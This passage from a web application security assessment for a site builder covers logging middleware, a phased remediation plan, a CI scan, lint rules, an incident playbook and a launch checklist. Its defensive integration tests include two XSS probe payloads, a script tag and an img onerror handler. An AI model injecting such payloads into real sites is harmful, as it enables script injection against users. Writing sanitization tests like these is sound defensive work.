  RATE_LIMIT_EXCEEDED: 'rate_limit_exceeded',
  
  // File Operations
  UPLOAD_INVALID: 'upload_invalid',
  UPLOAD_TOO_LARGE: 'upload_too_large',
  
  // CSRF
  CSRF_TOKEN_INVALID: 'csrf_token_invalid',
  CSRF_TOKEN_MISSING: 'csrf_token_missing',
  
  // Webhooks
  WEBHOOK_SIGNATURE_INVALID: 'webhook_signature_invalid'
};
```

**Integrate with Middleware:**

```javascript
// server/middleware/auth.js
import { logSecurityEvent, SecurityEvents } from '../utils/securityLogger.js';

export async function requireAuth(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    logSecurityEvent({
      type: SecurityEvents.UNAUTHORIZED_ACCESS,
      severity: 'medium',
      ip: req.ip,
      userAgent: req.get('user-agent'),
      details: { endpoint: req.path }
    });
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    // ... success ...
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      logSecurityEvent({
        type: SecurityEvents.TOKEN_EXPIRED,
        severity: 'low',
        ip: req.ip,
        details: { endpoint: req.path }
      });
    } else {
      logSecurityEvent({
        type: SecurityEvents.TOKEN_INVALID,
        severity: 'high',  // Possible attack
        ip: req.ip,
        details: { endpoint: req.path, error: err.message }
      });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

## 4. 🎯 PRIORITIZED IMPLEMENTATION PLAN

### Phase 1: CRITICAL - Production Blockers (Week 1)

**Must be completed before production launch**

| Priority | Task | Files to Change | Severity | Effort |
|----------|------|----------------|----------|--------|
| P0-1 | Fix CSRF Protection | `server.js`, `server/middleware/csrf.js`, `src/services/api.js` | CRITICAL | 4h |
| P0-2 | Visual Editor XSS Prevention | `server/services/siteService.js`, `server/utils/htmlSanitizer.js` | CRITICAL | 8h |
| P0-3 | Secure JWT Storage (HttpOnly Cookies) | `server.js`, `server/middleware/auth.js`, `src/context/AuthContext.jsx` | HIGH | 6h |
| P0-4 | Add Security Headers (Helmet) | `server.js` | MEDIUM | 2h |

**Total Effort: 20 hours (2.5 days)**

---

### Phase 2: HIGH - Essential Security (Week 2)

| Priority | Task | Files to Change | Severity | Effort |
|----------|------|----------------|----------|--------|
| P1-1 | Enhanced Rate Limiting | `server/middleware/rateLimiting.js`, `server.js` | MEDIUM | 4h |
| P1-2 | Ownership Verification (IDOR) | `server/routes/sites.routes.js`, add ownership checks | HIGH | 6h |
| P1-3 | Improved File Upload Validation | `server/utils/fileValidator.js`, `server/routes/uploads.routes.js` | MEDIUM | 4h |
| P1-4 | Session Regeneration on Login | `server.js` (auth endpoints) | MEDIUM | 2h |
| P1-5 | Stripe Webhook Idempotency | `server.js` (webhook handler) | MEDIUM | 3h |

**Total Effort: 19 hours (2.5 days)**

---

### Phase 3: MEDIUM - Defense in Depth (Week 3)

| Priority | Task | Files to Change | Severity | Effort |
|----------|------|----------------|----------|--------|
| P2-1 | Security Event Logging | `server/utils/securityLogger.js`, integrate across middleware | LOW | 6h |
| P2-2 | Dependency Vulnerability Scanning | CI/CD pipeline, GitHub Actions | LOW | 3h |
| P2-3 | Email Injection Prevention | `server/services/emailService.js` | LOW | 2h |
| P2-4 | Environment Variable Validation | `server.js` (startup checks) | LOW | 2h |
| P2-5 | Add Token Blacklist (JWT Revocation) | `server/utils/tokenBlacklist.js`, Redis | MEDIUM | 8h |

**Total Effort: 21 hours (2.5 days)**

---

### Phase 4: LOW - Monitoring & Compliance (Week 4)

| Priority | Task | Files to Change | Severity | Effort |
|----------|------|----------------|----------|--------|
| P3-1 | Implement Audit Logs | `server/services/auditService.js` | LOW | 6h |
| P3-2 | GDPR Compliance (Data Export/Delete) | `server/routes/user.routes.js` | LOW | 8h |
| P3-3 | Security Documentation | `docs/security/` | LOW | 4h |
| P3-4 | Penetration Testing Preparation | Various | LOW | 4h |
| P3-5 | Incident Response Plan | `docs/security/INCIDENT-RESPONSE.md` | LOW | 3h |

**Total Effort: 25 hours (3 days)**

---

## 5. 📋 TESTING STRATEGY

### 5.1 Security Testing Checklist

#### A. Authentication & Authorization

```bash
# Test 1: JWT Token Storage
✅ Tokens in httpOnly cookies (not localStorage)
✅ Tokens expire after 7 days
✅ Expired tokens rejected
✅ Invalid tokens rejected
✅ No token provided → 401 Unauthorized

# Test 2: CSRF Protection
✅ CSRF token required for POST/PUT/DELETE
✅ Missing CSRF token → 403 Forbidden
✅ Invalid CSRF token → 403 Forbidden
✅ CSRF token tied to session
✅ GET requests don't require CSRF

# Test 3: Authorization
✅ Admin endpoints require admin role
✅ Users can only access their own sites (IDOR test)
✅ Suspended accounts blocked
✅ Role changes take effect immediately
```

#### B. Input Validation

```bash
# Test 4: XSS Prevention
✅ Script tags removed from site content
✅ Event handlers (onclick, etc.) removed
✅ javascript: URLs blocked
✅ data: URLs handled safely
✅ CSP headers present on generated sites

# Test 5: SQL Injection
✅ All database queries use parameterization (Prisma)
✅ No raw SQL with string interpolation
✅ Special characters in input don't cause errors

# Test 6: File Upload Security
✅ Only images allowed (magic bytes checked)
✅ File size limits enforced (10MB)
✅ EXIF data stripped
✅ Files stored with random names
✅ Path traversal prevented
```

#### C. Rate Limiting

```bash
# Test 7: Brute Force Protection
✅ Login limited to 5 attempts per 15 minutes
✅ API limited to 100 requests per 15 minutes
✅ Uploads limited to 50 per hour
✅ Rate limits return 429 Too Many Requests
✅ Rate limits reset after time window
```

#### D. Third-Party Integration Security

```bash
# Test 8: Stripe Webhooks
✅ Signature verification enabled
✅ Invalid signatures rejected
✅ Duplicate events handled (idempotency)
✅ Webhook endpoint rate limited

# Test 9: Google OAuth
✅ State parameter prevents CSRF
✅ Redirect URI validated
✅ Only required scopes requested
✅ Tokens stored securely
```

### 5.2 Automated Security Testing

#### A. Dependency Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, staging]
  pull_request:
  schedule:
    - cron: '0 0 * * 0'  # Weekly

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run npm audit
        run: npm audit --audit-level=high
      
      - name: Run Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
```

#### B. Static Analysis

```bash
# Install ESLint security plugin
npm install --save-dev eslint-plugin-security

# .eslintrc.js
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-unsafe-regex": "error",
    "security/detect-buffer-noassert": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-no-csrf-before-method-override": "error",
    "security/detect-possible-timing-attacks": "warn"
  }
}
```

#### C. Integration Tests

```javascript
// tests/security/xss-prevention.test.js
describe('XSS Prevention', () => {
  it('should strip script tags from site content', async () => {
    const maliciousContent = {
      sections: [{
        type: 'html',
        content: '<div>Hello</div><script>alert("XSS")</script>'
      }]
    };
    
    const response = await request(app)
      .post('/api/sites')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ siteData: maliciousContent })
      .expect(201);
    
    const site = await prisma.site.findUnique({
      where: { id: response.body.id }
    });
    
    expect(site.data.sections[0].content).not.toContain('<script>');
    expect(site.data.sections[0].content).toContain('Hello');
  });
  
  it('should remove event handlers', async () => {
    const maliciousContent = {
      sections: [{
        content: '<img src=x onerror="alert(1)">'
      }]
    };
    
    const response = await request(app)
      .post('/api/sites')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ siteData: maliciousContent })
      .expect(201);
    
    const site = await prisma.site.findUnique({
      where: { id: response.body.id }
    });
    
    expect(site.data.sections[0].content).not.toContain('onerror');
  });
});

// tests/security/csrf-protection.test.js
describe('CSRF Protection', () => {
  it('should reject POST without CSRF token', async () => {
    await request(app)
      .post('/api/sites')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ subdomain: 'test' })
      .expect(403);
  });
  
  it('should accept POST with valid CSRF token', async () => {
    // Get CSRF token
    const tokenRes = await request(app)
      .get('/api/csrf-token')
      .expect(200);
    
    const csrfToken = tokenRes.body.csrfToken;
    
    // Use token in request
    await request(app)
      .post('/api/sites')
      .set('Authorization', `Bearer ${userToken}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', tokenRes.headers['set-cookie'])
      .send({ subdomain: 'test', templateId: 'restaurant' })
      .expect(201);
  });
});
```

---

## 6. 📊 SECURITY METRICS & KPIs

### Key Performance Indicators

| Metric | Target | Current | Status |
|--------|--------|---------|--------|
| **Dependency Vulnerabilities** | 0 high/critical | ? | 🔴 Unknown |
| **CSRF Protection Coverage** | 100% of state-changing endpoints | ~70% (auth bypassed) | 🟠 Partial |
| **XSS Prevention** | 100% of user content sanitized | 0% (no sanitization) | 🔴 Critical |
| **Rate Limiting** | All endpoints | Partial | 🟠 Partial |
| **Failed Login Attempts** | < 1% daily | ? | 🔴 Unknown |
| **Unauthorized Access Attempts** | Logged + alerted | Not tracked | 🔴 Unknown |
| **Security Audit** | Quarterly | Never | 🔴 Required |
| **Penetration Test** | Annually | Never | 🔴 Required |
| **Incident Response Time** | < 1 hour | No plan | 🔴 Required |

### Monitoring Dashboard

```javascript
// server/routes/admin/security-dashboard.js
import { requireAdmin } from '../../middleware/auth.js';

router.get('/admin/security/dashboard', requireAdmin, async (req, res) => {
  // Aggregate security metrics from logs
  const last24h = new Date(Date.now() - 24 * 60 * 60 * 1000);
  
  const metrics = {
    authentication: {
      loginAttempts: await getLoginAttempts(last24h),
      failedLogins: await getFailedLogins(last24h),
      successRate: '...'
    },
    authorization: {
      unauthorizedAttempts: await getUnauthorizedAttempts(last24h),
      permissionDenied: '...'
    },
    rateLimiting: {
      requestsBlocked: await getRateLimitExceeded(last24h),
      topOffenders: '...'
    },
    inputValidation: {
      xssAttempts: await getXSSAttempts(last24h),
      sqlInjectionAttempts: '...'
    },
    uploads: {
      totalUploads: '...',
      rejectedUploads: '...',
      rejectionReasons: '...'
    },
    webhooks: {
      invalidSignatures: '...',
      replayAttempts: '...'
    }
  };
  
  res.json(metrics);
});
```

---

## 7. 🚨 INCIDENT RESPONSE

### Incident Classification

| Level | Description | Example | Response Time |
|-------|-------------|---------|---------------|
| **P0 - Critical** | Active exploitation, data breach | XSS being exploited in production | < 15 minutes |
| **P1 - High** | Vulnerability discovered, not yet exploited | Unpatched critical CVE | < 2 hours |
| **P2 - Medium** | Security misconfiguration | Weak rate limits | < 24 hours |
| **P3 - Low** | Minor issue, low risk | Information disclosure | < 1 week |

### Response Playbook

#### Phase 1: Detection

```
1. Alert triggered (automated or manual report)
2. Verify incident is legitimate (not false positive)
3. Classify severity (P0-P3)
4. Notify incident response team
```

#### Phase 2: Containment

```
P0/P1 Incidents:
1. Isolate affected systems
2. Block attacking IPs (if identified)
3. Revoke compromised tokens/sessions
4. Enable "maintenance mode" if needed
5. Take database snapshot

P2/P3 Incidents:
1. Document issue
2. Plan fix timeline
```

#### Phase 3: Eradication

```
1. Identify root cause
2. Apply security patch
3. Update dependencies if vulnerable
4. Test fix in staging environment
5. Deploy to production
```

#### Phase 4: Recovery

```
1. Restore normal operations
2. Monitor for recurrence
3. Verify attack has stopped
4. Lift maintenance mode
```

#### Phase 5: Post-Mortem

```
1. Document timeline of events
2. Identify how attack succeeded
3. Document what worked/failed in response
4. Update security controls to prevent recurrence
5. Share lessons learned with team
```

---

## 8. 📚 RESOURCES

### Security Tools

- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Penetration testing toolkit
- **Snyk**: Dependency vulnerability scanner
- **npm audit**: Built-in Node.js security auditor
- **ESLint Security Plugin**: Static analysis for security issues

### Training & References

- **OWASP Top 10**: https://owasp.org/www-project-top-ten
- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org
- **Web Application Security** (Andrew Hoffman)
- **Release It!** (Michael Nygard) - Stability patterns
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework

### Compliance

- **GDPR**: https://gdpr.eu
- **CCPA**: https://oag.ca.gov/privacy/ccpa
- **PCI DSS**: https://www.pcisecuritystandards.org (if processing cards directly)

---

## 9. ✅ PRE-LAUNCH SECURITY CHECKLIST

### CRITICAL - Must Complete Before Launch

- [ ] **CSRF protection enabled** on ALL state-changing endpoints (no bypasses)
- [ ] **XSS prevention** - all user content sanitized
- [ ] **JWT tokens stored in httpOnly cookies** (not localStorage)
- [ ] **Security headers configured** (Helmet with CSP)
- [ ] **Rate limiting** on auth, API, and upload endpoints
- [ ] **HTTPS enforced** in production (HSTS enabled)
- [ ] **Environment secrets validated** at startup (no weak defaults)
- [ ] **Dependency vulnerabilities** scanned and patched (npm audit)
- [ ] **Ownership verification** on site/resource access (IDOR prevention)
- [ ] **File upload validation** - magic bytes + size limits
- [ ] **Error messages sanitized** - no stack traces or sensitive info
- [ ] **Database queries parameterized** (Prisma ✅, but verify no raw SQL)
- [ ] **Session management secure** - regenerate on login, expire on logout
- [ ] **Webhook signature verification** enabled (Stripe)
- [ ] **Security logging** implemented (failed logins, unauthorized access)
- [ ] **Incident response plan** documented
- [ ] **Backup and recovery** tested
- [ ] **Penetration test** completed (or scheduled)

### HIGH PRIORITY - Complete Within 30 Days

- [ ] **Token revocation/blacklist** implemented
- [ ] **Security monitoring dashboard** operational
- [ ] **Automated security scans** in CI/CD pipeline
- [ ] **Security audit** scheduled quarterly
- [ ] **GDPR compliance** - data export/delete
- [ ] **Security documentation** updated
- [ ] **Bug bounty program** considered

---

## 10. 🎓 KEY TAKEAWAYS

### For SiteSprintz Specifically

1. **Visual Editor is the #1 Attack Surface**: User-generated HTML must be sanitized
2. **Multi-Tenant Architecture = IDOR Risk**: Always verify ownership before allowing access
3. **JWT in localStorage = XSS Risk**: Move to httpOnly cookies immediately
4. **CSRF Bypass = Production Blocker**: Cannot launch with auth endpoints bypassed
5. **File Uploads Need Content Validation**: MIME type alone is insufficient

### General Security Principles

1. **Defense in Depth**: Multiple layers of protection (sanitization + CSP + escaping)
2. **Fail Securely**: Errors should default to denying access, not granting it
3. **Least Privilege**: Users/services should have minimum permissions needed
4. **Assume Breach**: Plan for compromise, not just prevention
5. **Security is Ongoing**: Not a one-time task - continuous monitoring required

### From "Web Application Security" Book

1. **Recon Matters**: Assume attackers will find all endpoints, technologies, dependencies
2. **Offense Informs Defense**: Understand attacker mindset to build better defenses
3. **No Security Through Obscurity**: Hiding tech stack doesn't prevent attacks
4. **Test Everything**: Automated security testing catches regressions

---

## NEXT STEPS

1. **Review this assessment** with engineering team
2. **Prioritize Phase 1 tasks** (production blockers)
3. **Create implementation tickets** with estimates
4. **Schedule security testing** after Phase 1 completion
5. **Establish security review process** for new features

**Estimated Time to Production-Ready Security**: 2-3 weeks (80-85 hours)

---

*This assessment is based on the current codebase as of November 17, 2025. Regular updates required as application evolves.*

